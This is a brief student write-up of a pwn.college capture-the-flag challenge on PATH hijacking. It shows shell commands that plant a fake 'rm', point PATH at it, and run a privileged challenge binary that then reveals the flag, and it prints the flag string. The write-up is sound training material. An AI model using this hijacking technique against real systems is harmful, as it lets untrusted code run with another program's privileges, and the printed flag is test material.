# hijacking commands

```bash
hacker@path~hijacking-commands:~$ nano /home/hacker/windir/rm
hacker@path~hijacking-commands:~$ chmod +x /home/hacker/windir/rm
hacker@path~hijacking-commands:~$ PATH=/home/hacker/windir
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
pwn.college{ci45c89lRzMNtXzBRJbBDTUSqT2.ddzNyUDLzATN0czW}
```

first i used nano to create rm in windir. then i used chmod to make sure that the rm file is executable and can be run by that particular shelll.
then i changed the path variable so that it will find out our fake rm first. then i executed the /challenge/run.
what happened here is that when i executed the /challenge/run command i read our fake rm file and then gave us the flag instead of deleting it.
